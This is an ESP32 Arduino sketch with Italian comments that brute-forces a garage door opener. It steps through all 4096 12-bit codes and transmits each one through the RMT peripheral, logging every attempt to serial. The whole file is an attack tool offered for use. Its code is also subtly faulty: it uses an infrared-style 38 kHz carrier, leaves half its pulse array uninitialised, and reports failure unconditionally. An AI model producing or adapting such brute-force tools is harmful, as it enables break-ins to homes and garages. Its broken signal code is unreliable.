#include "driver/rmt.h"

#define GPIO_TRANSMIT_PIN 25 // Pin GPIO usato come trasmettitore
#define RMT_CHANNEL RMT_CHANNEL_0

// Numero massimo di codici da provare (12 bit -> 2^12 combinazioni = 4096)
#define MAX_CODES 4096

void setup() {
  Serial.begin(115200); // Inizializza la seriale per il monitoraggio
  Serial.println("Inizio del brute force sul garage...");

  // Configura il canale RMT per trasmissione
  rmt_config_t config = {
      .rmt_mode = RMT_MODE_TX,
      .channel = RMT_CHANNEL,
      .gpio_num = (gpio_num_t)GPIO_TRANSMIT_PIN, // Cast al tipo corretto
      .clk_div = 80, // Divisore clock (1 μs per tick con 80 MHz clock)
      .mem_block_num = 1,
      .tx_config = {
          .carrier_freq_hz = 38000, // Frequenza del segnale (personalizzabile)
          .carrier_level = RMT_CARRIER_LEVEL_HIGH,
          .idle_level = RMT_IDLE_LEVEL_LOW,
          .carrier_duty_percent = 50,
          .loop_en = false,
          .idle_output_en = true,
      }};
  rmt_config(&config);
  rmt_driver_install(config.channel, 0, 0);
}

void loop() {
  // Cicla su tutte le combinazioni di codici (12 bit -> 4096 combinazioni)
  for (uint16_t code = 0; code < MAX_CODES; code++) {
    Serial.print("Tentativo codice: ");
    Serial.println(code); // Stampa il codice corrente sul Serial Monitor
    sendSignal(code);     // Invia il codice tramite RMT
    delay(10);           // Attendi tra i tentativi (può essere regolato)
  }

  // Se hai provato tutti i codici, stampa un messaggio e interrompi il loop
  Serial.println("Brute force completato. Nessun codice funzionante trovato.");
  while (true) {
    delay(1000); // Blocca il loop dopo il completamento
  }
}

void sendSignal(uint16_t code) {
  // Crea un array di impulsi per simulare il segnale radio
  rmt_item32_t items[24];
  for (int i = 0; i < 12; i++) {
    if (code & (1 << i)) { // Se il bit è 1
      items[i * 2].level0 = 1;
      items[i * 2].duration0 = 562; // Livello alto (durata per "1")
      items[i * 2].level1 = 0;
      items[i * 2].duration1 = 562; // Livello basso
    } else { // Se il bit è 0
      items[i * 2].level0 = 1;
      items[i * 2].duration0 = 562; // Livello alto (durata per "0")
      items[i * 2].level1 = 0;
      items[i * 2].duration1 = 1687; // Livello basso
    }
  }

  // Trasmetti il segnale tramite RMT
  rmt_write_items(RMT_CHANNEL, items, 24, true);
}
